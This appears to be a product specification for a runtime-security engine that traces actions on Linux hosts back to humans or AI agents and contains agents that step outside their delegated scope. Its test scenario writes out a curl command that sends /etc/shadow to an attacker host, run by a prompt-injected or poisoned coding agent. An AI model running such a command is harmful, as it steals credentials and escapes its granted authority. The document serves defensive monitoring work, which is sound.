# Sentinel Runtime Engine v1 — Master Architecture & Product Specification

**Document ID:** `SPEC-SENTINEL-RUNTIME-ENGINE-V1`  
**Revision:** `R1 (Post-Peer Review & Autonomous Response Expansion)`  
**Status:** `DRAFT — ARCHITECTURE BLUEPRINT & PRODUCT SPECIFICATION`  
**Date:** 2026-11-04  
**Target Workloads:** Linux Servers, Containerized Cloud Infrastructure, Hybrid Human & AI Agent Environments  
**Telemetry Baseline:** Cilium Tetragon v1.8.0, OpenTelemetry GenAI & MCP Semantic Conventions  
**Commercial Backing:** Sentinel Cloud Platform (API Key / Cross-Host Threat Intelligence / Code-to-Runtime Correlation)  

---

## 1. Executive Product Vision & Strategic Positioning

### 1.1 The Operational Problem in Modern Environments
Modern cloud infrastructure is no longer operated solely by human engineers running static bash scripts or fixed CI/CD pipelines. Today, infrastructure execution is **hybrid**:
1. **Human Operators:** Developers, DevOps, and SREs using SSH, sudo, bastion hosts, and administrative CLIs.
2. **Automated Services:** Background cron jobs, deployment microservices, and Kubernetes controllers.
3. **Autonomous AI Coding & Operations Agents:** LLM-based autonomous agents executing tools, dispatching sub-processes, querying internal APIs via Model Context Protocol (MCP), editing configuration files, and triggering cloud deploys.

When an unexpected file modification, exfiltration attempt, or anomalous process occurs, existing security tools produce disconnected observations:
- **Kernel eBPF Sensors (Tetragon/Falco):** Detect `pid 4812 executed curl -X POST https://api.internal/data`, but have **zero visibility** into whether that process was spawned by an authenticated developer, an unattended background daemon, or an autonomous AI agent acting on behalf of a user.
- **Agent Governance Toolkits (Microsoft AGT, LangSmith, Tracing):** Record that `Agent-02 invoked tool exec_shell`, but have **zero visibility** into what syscalls the kernel actually executed, whether child processes were spawned, or if the process escaped its designated working directory.
- **Traditional SIEM / EDR (Sysdig, Datadog, Wazuh):** Collect high-volume logs and apply heuristic pattern matching, but do not provide verifiable cryptographic chains linking human delegation $\to$ agent intention $\to$ kernel telemetry $\to$ tamper-evident proof.

### 1.2 What Sentinel Runtime Is
> **Sentinel Runtime is a local-first observability, security attribution, and autonomous response engine for hybrid environments where humans, automated services, and AI agents interact on Linux infrastructure.**

Sentinel Runtime answers five non-negotiable questions for every security-relevant action:
1. **Actor Attribution:** Who initiated this action? (`HUMAN`, `AI_AGENT`, `SERVICE`, `WORKLOAD`, or `UNKNOWN`).
2. **Authority & Delegation Chain:** Under whose authority was the action taken, through what delegation path, and via which tool/workflow?
3. **Physical Execution:** What processes, kernel syscalls, network connections, and file modifications actually occurred on the host?
4. **Verifiable Provenance:** What exact telemetry was received from the sensor, what was interpreted, and what gaps or uncertainties exist?
5. **Deterministic Action:** What local containment or cloud escalation policy was triggered, with full auditability and zero hallucination?

### 1.3 What Sentinel Runtime Is NOT
- **It is NOT a bespoke eBPF kernel sensor:** Sentinel does not rewrite Tetragon or Falco. It builds on Tetragon's battle-tested eBPF engine.
- **It is NOT an in-memory alert firehose:** Sentinel focuses on deterministic causal chains, explicit data provenance, and immutable evidence, rather than generating noisy heuristic alerts.
- **It is NOT an online-only cloud dependency:** The local engine is 100% autonomous, runs air-gapped/offline, and requires no external network connection to observe, correlate, persist evidence, and execute local pre-authorized containment.

---

## 2. The 8 Core Subsystems of the Local Engine

```
                                  TELEMETRY SOURCES
  ┌───────────────────────────────────────────────────────────────────────────────────┐
  │  Tetragon (eBPF)  │  OpenTelemetry (OTel)  │  Falco / Audit  │  AI Agent / MCP    │
  └───────────────────┴────────────────────────┴─────────────────┴───────────────────┘
                                           │
                                           ▼
  ┌───────────────────────────────────────────────────────────────────────────────────┐
  │ 01. Source Integration Layer (Ingress Gateways & Read-Only Proxy)                 │
  └───────────────────────────────────────────────────────────────────────────────────┘
                                           │ (Raw Wire Bytes + Ingress Sequence)
                                           ▼
  ┌───────────────────────────────────────────────────────────────────────────────────┐
  │ 02. Evidence Acquisition & Provenance Engine                                      │
  │     - Raw Wire Hash (SHA-256) & Length-Prefixed Keys (Profiles A, B, C, D)        │
  │     - Explicit Loss Accounting (Ringbuf, Queue, Throttle, Gap)                    │
  │     - Event Contract v2 Materialization                                           │
  └───────────────────────────────────────────────────────────────────────────────────┘
                                           │
                        ┌──────────────────┴──────────────────┐
                        ▼                                     ▼
  ┌─────────────────────────────────────┐   ┌─────────────────────────────────────────┐
  │ 03. Hybrid Identity & Attribution   │   │ 04. Causal Correlation & Activity Graph │
  │     - Principal vs Process vs Token │   │     - In-Memory Causal DAG              │
  │     - OTel GenAI & MCP SemConv      │──▶│     - Durable Reconstructibility        │
  │     - Strict "UNKNOWN" Invariant    │   │     - Deduplication & Process Anchoring │
  └─────────────────────────────────────┘   └─────────────────────────────────────────┘
                        │                                     │
                        └──────────────────┬──────────────────┘
                                           ▼
  ┌───────────────────────────────────────────────────────────────────────────────────┐
  │ 05. Deterministic Detection & Policy Engine                                       │
  │     - Workload & Delegation Profiles (Digests, CIDRs, Paths)                      │
  │     - Boundary Enforcement (Agent Escapes, Privilege Escalation)                  │
  │     - Zero-Hallucination Explainability                                           │
  └───────────────────────────────────────────────────────────────────────────────────┘
                                           │
                        ┌──────────────────┴──────────────────┐
                        ▼                                     ▼
  ┌───────────────────────────────────────────┐ ┌─────────────────────────────────────┐
  │ 06. Response & Containment Engine         │ │ 07. Evidence, Durability & Ledger   │
  │     - Levels R0 to R4 (Observe to Kernel) │ │     - Append-Only Disk Journal      │
  │     - Local Autonomous Containment (cgroup│ │     - SQLite Hash Chain (SHA-256)   │
  │       network drop, MCP session kill)     │ │     - Offline Dossier Packager      │
  │     - Zero-Dependency Air-Gap Operation   │ │     - WORM / S3 Object Lock Export  │
  └───────────────────────────────────────────┘ └─────────────────────────────────────┘
                        │                                     │
                        └──────────────────┬──────────────────┘
                                           ▼
  ┌───────────────────────────────────────────────────────────────────────────────────┐
  │ 08. Local Runtime Interface & Cloud Control Bridge                                │
  │     - CLI (`status`, `verify-ledger`, `export-dossier`, `containment`)            │
  │     - Filtered Local Unix Socket RPC & Prometheus Metrics                         │
  │     - Sentinel Cloud API Key Bridge (Incident Intelligence Envelope)              │
  └───────────────────────────────────────────────────────────────────────────────────┘
```

---

### Subsystem 01: Source Integration Layer
**Purpose:** Safely ingest heterogeneous runtime signals while strictly isolating the host and runtime from sensor vulnerabilities.

- **Tetragon gRPC & JSONL Collector:**
  - Pins to Tetragon `v1.8.0`.
  - Connects downstream to a read-only gRPC proxy (`src/collectors/tetragon-readonly-proxy.js`) exposing only `GetVersion` and `GetEvents`.
  - Preserves exact upstream protobuf wire bytes, including unknown fields, without deserialization loss.
- **OpenTelemetry & AI Agent Receiver (MCP Bridge):**
  - Accepts OpenTelemetry spans conforming to pinned GenAI Semantic Conventions (`gen_ai.system`, `gen_ai.agent.id`, `gen_ai.tool.name`).
  - Receives MCP (Model Context Protocol) tool execution receipts containing correlation tokens (`trace_id`, `execution_id`, `caller_identity`).
- **Auditd / Linux System Hooks:**
  - Ingests user login records (`pam`, `utmp`, `sshd`) to map interactive sessions to physical TTYs and process subtrees.

---

### Subsystem 02: Evidence Acquisition & Provenance Engine
**Purpose:** Establish immutable data provenance before any analytical parsing or behavioral transformation occurs.

- **Cryptographic Event Key Invariants:**
  - Employs 8-byte big-endian unsigned length-prefixed domain separation (`src/contracts/event-keys.js`).
  - **Profile A (`RAW_PROVIDER_EVENT`):** For native sensor events with complete process context (`host_id`, `boot_id`, `exec_id`, `event_type`, `source_timestamp`, `raw_payload_sha256`).
  - **Profile B (`DERIVED_CORRELATED_EVENT`):** For joined multi-event occurrences; keyed on constituent event keys, rule ID, and version.
  - **Profile C (`SYNTHETIC_OBSERVABILITY_EVENT`):** For locally generated health, metrics, and gap notifications; keyed on producer identity, epoch, sequence, and event type.
  - **Profile D (`RAW_PARTIAL_PROCESS_EVENT` — Provisional):** For provider events omitting `exec_id`; anchored on `(host_id, boot_id, pid, process_start_time, event_type, source_timestamp, raw_payload_sha256)`.
- **Explicit Loss Accounting:**
  - Strictly separates loss domains: `kernel_ring_buffer`, `sensor_queue`, `sensor_throttle` (rate limits), and `transport_gap`.
  - Rejects synthetic or aggregated loss estimates; if a sensor disconnects, gap duration is recorded, and event count is marked `null` with status `UNKNOWN`.

---

### Subsystem 03: Hybrid Identity & Attribution Engine
**Purpose:** Unify human, automated, and AI agent identities into a cohesive, auditable hierarchy without fabricating links.

- **Strict Identity Separation Invariant:**
  The engine enforces four distinct, decoupled relationships that must never be collapsed into a single heuristic:
  1. **Authenticated Principal:** The verified identity asserting authority (e.g., OIDC email, SSH public key hash).
  2. **Kernel Process Identity:** The OS-level execution context (`host_id`, `boot_id`, `pid`, `ruid`, `euid`, `cgroup`, namespaces).
  3. **Signed Delegation Token:** The cryptographic credential issued by the principal authorizing specific scopes or tools.
  4. **Causal Execution Link:** The proven, time-bounded linkage connecting a delegated tool call to a spawned kernel process.
  *Invariant:* If any link in this chain cannot be proven with verifiable telemetry, the actor status is strictly evaluated as `UNKNOWN`.

- **Semantic Convention Pinning:**
  - Standardizes on OpenTelemetry GenAI Semantic Conventions (`gen_ai.system`, `gen_ai.agent.id`, `gen_ai.agent.name`, `gen_ai.tool.name`, `gen_ai.tool.call_id`).
  - Aligns with Model Context Protocol (MCP) JSON-RPC 2.0 specs for tool discovery, sampling, and call invocation.

---

### Subsystem 04: Causal Correlation & Activity Graph
**Purpose:** Construct a local, directed causal graph connecting high-level intent to low-level system actions.

```mermaid
graph TD
    H["Principal: HUMAN (alice@corp.com)"] -->|Issues Delegation| D["Delegation Token: Scope(code_review)"]
    D -->|Authorizes| A["Agent: AI_AGENT (refactor-bot-42)"]
    A -->|Invokes MCP Tool| T["Tool Call: mcp::run_linter"]
    T -->|Causal Link (W3C traceparent)| P["Process: /usr/bin/eslint (pid: 14205)"]
    P -->|Executes Syscall| F["File: /workspace/src/index.js (openat2)"]
    P -->|Unexpected Fork| X["Process: /bin/bash -i (pid: 14280)"]
    X -->|Violation Detection| V["Alert / Containment Trigger"]
```

- **Graph Durability Invariant:**
  - The in-memory Causal DAG is an ephemeral index designed for fast lookup and correlation.
  - **State Reconstructibility:** Every node and edge in the graph can be 100% reconstructed from the durable journal and SQLite ledger upon agent restart. Memory eviction follows a strict LRU window without losing disk provenance.

---

### Subsystem 05: Deterministic Detection & Policy Engine
**Purpose:** Evaluate runtime behavior against explicit, explainable security policies without heuristic "black-box" hallucination.

- **Workload & Delegation Profiles:**
  - Exact binary path or SHA-256 digest pinning.
  - Strict destination constraints (hostnames, port numbers, IPv4/IPv6 CIDRs).
  - Sensitive path boundaries (e.g., `/etc/shadow`, AWS/GCP credential directories).
- **Agent Delegation Boundaries:**
  - Defines which tools an AI agent is authorized to invoke and what OS-level binaries those tools are allowed to spawn.
  - Triggers an alert or observation when an agent attempts an action outside its authorized delegation tree (e.g., an agent tasked with code review running `nmap` or modifying `/etc/hosts`).
- **Verdicts:** Produces deterministic findings: `NORMAL`, `SUSPICIOUS`, `POLICY_VIOLATION`, or `UNKNOWN`.

---

### Subsystem 06: Response & Containment Engine (Autonomous Defense)
**Purpose:** Enable predictable, graduated responses to verified threats both locally (offline/air-gapped) and across enterprise fleets.

```
 LEVEL   NAME                      MECHANISM                       NETWORK/CLOUD
 ──────  ────────────────────────  ──────────────────────────────  ─────────────
 R0      Observe & Record          Write to tamper-evident ledger  Autonomous
 R1      Local Immediate Alert     Syslog, Unix socket RPC, stdout Autonomous
 R2      Human-in-the-Loop Wait    Hold action pending approval    Autonomous / SaaS
 R3      Pre-Authorized Contain    Local cgroup netdrop, kill      Autonomous
 R4      Kernel Policy Block       Tetragon eBPF enforcement       Autonomous
```

- **Level R0 — Observe & Record:**
  Default passive mode. Records the full causal chain to the tamper-evident ledger without altering system execution.
- **Level R1 — Immediate Local Alert:**
  Emits real-time event notifications over local Unix socket (`/run/sentinel/notify.sock`), systemd journal, and syslog.
- **Level R2 — Human-in-the-Loop Recommendation:**
  When an ambiguous or high-impact delegation boundary is approached, pauses tool execution and requests operator verification (via local CLI or Sentinel Cloud web console).
- **Level R3 — Pre-Authorized Local Containment (Autonomous Air-Gap Mode):**
  Operates 100% locally without cloud dependency. If a high-confidence violation occurs:
  1. **MCP Session Suspension:** Sends a cancellation signal to the agent runner / MCP bridge.
  2. **Process Subtree Termination:** Issues `SIGTERM` / `SIGKILL` to the offending process subtree anchored on `exec_id`.
  3. **Network Egress Drop:** Drops outbound traffic for the offending container/cgroup using local `nftables` or `iptables` rules without affecting the rest of the host.
- **Level R4 — Kernel-Level Prevention (eBPF Enforcement):**
  Enforces inline syscall denial (`SIGKILL` or `-EPERM`) via Tetragon TracingPolicy enforcement.
  *Safety Boundary:* The Tetragon enforcement channel is strictly separated from the read-only monitoring proxy. Enforcement policies must be pre-compiled, cryptographically signed, and loaded through a dedicated privileged control plane.

---

### Subsystem 07: Evidence, Durability & Ledger Engine
**Purpose:** Store all accepted events and verdicts in a tamper-evident, crash-resilient local ledger.

- **Durable Disk Spool (Pre-Ingest Journal):**
  - Append-only write-ahead log for raw protobuf wire bytes before parsing.
  - Ensures that if the collector or engine restarts, uncommitted records are re-delivered without data loss.
- **SQLite Evidence Hash Chain:**
  - Uses `node:sqlite` built-in engine.
  - Every committed record includes: `event_id`, `source_event_key`, `canonical_payload`, `timestamp`, and `prev_hash`.
  - Hash formula: $\text{RecordHash}_n = \text{SHA-256}(\text{RecordHash}_{n-1} \,\|\, \text{CanonicalPayload}_n)$.
- **Tamper Boundaries:**
  - Detects accidental corruption or unauthorized row deletions/insertions.
  - Root protection requires remote Ed25519 root anchoring and WORM export (S3 Object Lock).

---

### Subsystem 08: Local Runtime Interface & Cloud Control Bridge
**Purpose:** Provide operators with transparent local inspection and provide a secure, authenticated bridge to Sentinel Cloud.

- **Local CLI (`bin/sentinel-runtime.js`):**
  - `status`: Reports engine health, active collector status, loss counters, and version.
  - `validate-v2`: Standalone schema and cryptographic key validator for offline event files.
  - `verify-ledger`: Traverses SQLite hash chain from genesis to head and reports verification status.
  - `export-dossier`: Bundles an incident or time window into a standalone, verifiable evidence dossier (JSONL + cryptographic manifest).
- **Telemetry Endpoints:**
  - Prometheus `/metrics` endpoint exposing ingestion throughput, queue depths, deduplication counts, and loss metrics.
  - Unix socket RPC interface restricted to administrative accounts (`0660` mode).
- **Cloud Bridge (API Key Integration):**
  - Optional outbound HTTPS/mTLS connection to Sentinel Cloud.
  - Transmits a sanitized **Incident Intelligence Envelope**.

---

## 3. Commercial Synergy: Sentinel Cloud & The "Code-to-Runtime" Flywheel

```
┌─────────────────────────────────────────────────────────────────────────────────────────┐
│                                 SENTINEL CLOUD PLATFORM                                 │
│                                                                                         │
│   ┌───────────────────────────────┐           ┌──────────────────────────────────────┐  │
│   │   Code & Supply Chain SAST    │           │     Cross-Host Fleet Intelligence    │  │
│   │   - PR Security Audits        │           │     - Centralized Activity Graph     │  │
│   │   - Dependency Scanner        │           │     - Multi-node Incident Correlation│  │
│   │   - Malicious Code Findings   │           │     - Enterprise SIEM Exporters      │  │
│   └──────────────┬────────────────┘           └──────────────────▲───────────────────┘  │
│                  │                                               │                      │
│                  ▼                                               │ (Incident Envelope)  │
│   ┌──────────────────────────────────────────────────────────────┴───────────────────┐  │
│   │              CODE-TO-RUNTIME ATTRIBUTION & CORRELATION ENGINE                    │  │
│   │  "PR #142 introduced vulnerable parser -> Container X spawned by Agent Y         │  │
│   │   attempted unauthorized /etc/shadow access via that exact call path"            │  │
│   └──────────────────────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────▲──────────────────────────────────────────────┘
                                           │ (API Key: `sentinel_api_token`)
                        ┌──────────────────┴──────────────────┐
                        │                                     │
          ┌───────────────────────────┐         ┌───────────────────────────┐
          │ Host 01: Sentinel Runtime │         │ Host N: Sentinel Runtime │
          │ (100% Autonomous Offline) │         │ (100% Autonomous Offline) │
          └───────────────────────────┘         └───────────────────────────┘
```

### 3.1 The Incident Intelligence Envelope
When connected to Sentinel Cloud via API key, Sentinel Runtime does **NOT** stream gigabytes of raw prompt text, private code, or customer proprietary data. Instead, it transmits a compact, sanitized envelope:

```json
{
  "envelope_version": "1.0.0",
  "organization_id": "org_enterprise_corp",
  "host_id": "prod-worker-eu-04",
  "incident_id": "inc_9921_8812a",
  "timestamp": "2026-11-04T01:30:00.000Z",
  "actor_summary": {
    "actor_type": "AI_AGENT",
    "agent_id": "agent_auto_refactor",
    "delegated_by": "user_sre_lead",
    "attribution_confidence": "PROVEN_CRYPTOGRAPHIC"
  },
  "violation_details": {
    "rule_id": "SEC-RUL-EXEC-ESCAPE",
    "policy_level": "R3_CONTAINMENT_EXECUTED",
    "action_taken": "CGROUP_EGRESS_BLOCKED_AND_SIGKILL",
    "executable_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "target_destination": "198.51.100.22:4444"
  },
  "evidence_anchor": {
    "ledger_record_hash": "a8f5c...921",
    "root_hash_signature": "ed25519_sig_..."
  }
}
```

### 3.2 The Code-to-Runtime Strategic Advantage
Competitors either do static code scanning (Snyk, Semgrep) or runtime detection (Sysdig, Falco). Neither connects the two:
1. **Sentinel CLI & PR Gate** catches vulnerabilities, dependencies, and code flaws during PR reviews.
2. **Sentinel Runtime** observes live containers and AI agents executing in staging and production.
3. **The Flywheel:** Sentinel Cloud joins the PR commit hash and container build digest to the runtime execution graph. When an exploit or unauthorized action occurs, Sentinel instantly pinpoints:
   - Which developer or agent authored the vulnerable code.
   - Which PR introduced it.
   - Which runtime agent or attacker attempted to trigger it.

### 3.3 Commercial Bundling Model
- **Community Edition (Open Core):** 100% free, runs air-gapped, unlimited local events, local SQLite ledger, local CLI containment.
- **Enterprise Subscription (Annual Bundle):**
  - Sentinel Cloud SaaS control plane.
  - Code-to-Runtime correlation linking PR audits to production hosts.
  - Multi-host centralized activity graph.
  - External WORM evidence anchoring (S3 Object Lock + compliance retention).
  - SLA & Enterprise support.

---

## 4. Build vs. Buy / Ecosystem Reuse Matrix

| Subsystem / Layer | Strategy | Reused Technology | Proprietary Sentinel IP | Architecture Rationale |
|---|---|---|---|---|
| **Kernel Sensor** | **REUSE** | Cilium Tetragon (v1.8.0) | None (eBPF upstream) | Rewriting eBPF is a multi-year liability. Tetragon is proven and battle-tested. |
| **Telemetry Transport** | **REUSE** | OpenTelemetry Protobuf | Minimal envelope framing | Industry standard; enables plug-and-play with existing observability agents. |
| **Local Storage** | **REUSE** | SQLite (`node:sqlite`) | Hash-chain integrity logic | Embedded, ACID, zero-maintenance, crash-safe. |
| **Agent Protocols** | **REUSE** | Model Context Protocol (MCP) | Identity & span correlation | Fast-growing open standard for LLM tool use. |
| **Cloud Storage** | **REUSE** | AWS S3 Object Lock / MinIO | Dossier packager & signer | Built-in compliance WORM; no need to build bespoke storage clouds. |
| **Event Contract v2** | **BUILD** | JSON Schema Draft 2020-12 | Contract schemas & validators | Core IP: explicit loss domains, cryptographic event keys, zero-loss raw wire retention. |
| **Hybrid Identity Engine** | **BUILD** | None (Novel domain) | Attribution & delegation engine | Core IP: linking Human $\leftrightarrow$ AI Agent $\leftrightarrow$ Kernel execution. |
| **Activity Graph** | **BUILD** | None (Custom DAG) | Causal graph & time-window LRU | Core IP: deterministic cross-domain causal correlation. |
| **Autonomous Containment**| **BUILD** | Linux cgroups / nftables | Graduated response engine (R0-R4) | Core IP: deterministic, safe, automated defense without kernel panics. |

---

## 5. Competitor Capability & Differentiator Matrix

*Classification Legend:*
- **VERIFIED:** Confirmed in official product documentation and production code.
- **NOT_DOCUMENTED:** Product documentation does not describe or claim this capability.
- **NOT_TESTED:** Architectural claim not independently verified in our test environment.

| Capability | Cilium Tetragon | Falco | Sysdig Secure | Datadog CWP | **Sentinel Runtime + Cloud** |
|---|---|---|---|---|---|
| **Kernel Sensor** | Native eBPF (`VERIFIED`) | eBPF (`VERIFIED`) | Agent + eBPF (`VERIFIED`) | Agent + eBPF (`VERIFIED`) | **Reuses Tetragon eBPF** (`VERIFIED`) |
| **AI Agent / MCP Attribution**| `NOT_DOCUMENTED` | `NOT_DOCUMENTED` | `NOT_DOCUMENTED` | `NOT_DOCUMENTED` | **Native Attribution Engine** (`BUILD`) |
| **Deterministic Causal DAG** | Process tree only (`VERIFIED`)| `NOT_DOCUMENTED` | Proprietary SaaS (`VERIFIED`)| Proprietary SaaS (`VERIFIED`)| **Local Open Causal Graph** (`BUILD`) |
| **Original Wire Byte Retention**| Deserializes (`VERIFIED`) | Drops frames (`VERIFIED`) | Cloud-ingested (`VERIFIED`) | Cloud-ingested (`VERIFIED`) | **Exact Protobuf Wire Retention** (`VERIFIED`) |
| **Cryptographic Event Keys** | `NOT_DOCUMENTED` | `NOT_DOCUMENTED` | UUIDv4 (`VERIFIED`) | Log IDs (`VERIFIED`) | **Domain-Separated SHA-256 Keys** (`VERIFIED`) |
| **Loss & Gap Honesty** | Metric counters (`VERIFIED`) | Drops reported (`VERIFIED`)| Backend estimate (`VERIFIED`)| Backend estimate (`VERIFIED`)| **Explicit Loss Domains (Gap=UNKNOWN)** (`VERIFIED`) |
| **Tamper-Evident Ledger** | `NOT_DOCUMENTED` | `NOT_DOCUMENTED` | SaaS custody (`VERIFIED`) | SaaS custody (`VERIFIED`) | **Local SQLite Hash Chain** (`VERIFIED`) |
| **Air-Gap Autonomous Defense** | Kill via policy (`VERIFIED`) | Alert only (`VERIFIED`) | SaaS required (`VERIFIED`)| SaaS required (`VERIFIED`)| **R0–R4 Local Autonomous Defense** (`BUILD`) |
| **Code-to-Runtime Correlation**| `NOT_DOCUMENTED` | `NOT_DOCUMENTED` | Limited (`VERIFIED`) | Limited (`VERIFIED`) | **PR Audit to Syscall Trace** (`BUILD`) |

---

## 6. Single End-to-End MVP Scenario: "The Rogue Coding Agent"

To validate the architecture, Phase 001 and Phase 002 must successfully execute this single end-to-end scenario:

```
SCENARIO SUMMARY:
1. Operator Alice authorizes AI Agent "refactor-bot" to perform TypeScript linting via MCP.
2. The agent executes tool `run_linter`, which spawns `/usr/bin/npm run lint`.
3. A poisoned dependency or prompt injection causes the process to execute `/bin/curl -F data=@/etc/shadow http://evil.attacker/exfil`.
```

### Verification & Pass/Fail Criteria
- [ ] **Provenance:** Raw Tetragon protobuf bytes for `execve` and `connect` are preserved in the pre-ingest journal with valid SHA-256 wire hash.
- [ ] **Attribution:** The engine attributes `curl` to `AI_AGENT:refactor-bot` delegated by `HUMAN:alice`, with confidence `OBSERVED_CORRELATED`.
- [ ] **Detection:** The policy engine flags `/etc/shadow` read and external socket connection as `POLICY_VIOLATION`.
- [ ] **Response:** Engine executes Level R3 containment: terminates the offending process subtree and drops cgroup network egress.
- [ ] **Evidence:** SQLite ledger commits the event chain with unbroken cryptographic hash links.
- [ ] **Cloud Bridge:** If connected, transmits a sanitized Incident Intelligence Envelope to Sentinel Cloud; if air-gapped, completes 100% of the defense locally.

---

## 7. Criteria for "Engine Complete" (Stop Conditions for Local MVP)

The Sentinel Runtime Local Engine v1 is declared **COMPLETE** when all 6 gates are closed:

- [ ] **Gate 1: Event Contract v2 Frozen (`SCHEMA-V2-FROZEN`)**  
  Schema v2 candidate approved, 14 event families compile cleanly under Draft 2020-12, SHA-256 anchor frozen.
- [ ] **Gate 2: Live Sensor Telemetry Gate (`LIVE-SENSOR-V1`)**  
  Validated against live Tetragon v1.8.0 daemon on Linux; TracingPolicy CRDs verified; loss counters verified with counter-delta and reset tests.
- [ ] **Gate 3: Durability & Spool Journal Gate (`DURABILITY-V1`)**  
  Append-only pre-ingest spool implemented; crash recovery tested; sensor disconnect produces honest `gap_recorded` with `count: null` and status `UNKNOWN`.
- [ ] **Gate 4: Hybrid Attribution & MCP Gate (`HYBRID-ATTRIBUTION-V1`)**  
  OTel GenAI / MCP receiver correlates tool calls to kernel processes; non-correlated actions strictly marked `UNKNOWN`.
- [ ] **Gate 5: Autonomous Containment & Dossier Gate (`CONTAINMENT-EVIDENCE-V1`)**  
  Levels R0–R3 verified in offline environment; `export-dossier` packages verifiable evidence; `verify-ledger` flags tampering.
- [ ] **Gate 6: Native Linux Deployment Gate (`DEPLOYMENT-V1`)**  
  Systemd units verified with socket permissions `0660`; package builds on Ubuntu 22.04 and 24.04 LTS; 100% test pass on native Linux.

---

## 8. Prioritized Roadmap

```
PHASE 001C (DONE)       ──▶ Event Contract v2 Candidate Published & CI Verified (226/226 Linux Pass)
                                │
PHASE 001D (NEXT)       ──▶ Live Sensor Telemetry Validation (Tetragon v1.8.0 Real Hooks & Metrics)
                                │
PHASE 001E              ──▶ Stream Durability & Disk Spool Journal (Crash Recovery & Gap Policy)
                                │
PHASE 002               ──▶ Hybrid Identity Engine & MCP Tool Correlation (Human + AI Agent Attribution)
                                │
PHASE 003               ──▶ Autonomous Containment Engine (R0–R3 Local Response & Air-Gap Defense)
                                │
PHASE 004               ──▶ Evidence Dossier Export & Tamper-Evident Verification CLI
                                │
PHASE 005               ──▶ Sentinel Cloud Fleet Integration (API Key, Envelope & Code-to-Runtime Correlation)
```

**Instruction for Engineering Agents:**  
Do NOT deviate from the scope defined in this specification. Do NOT begin Phase 001D implementation without an authorized TracingPolicy test plan. Do NOT implement bespoke in-memory alerting firehoses or closed SaaS dependencies.
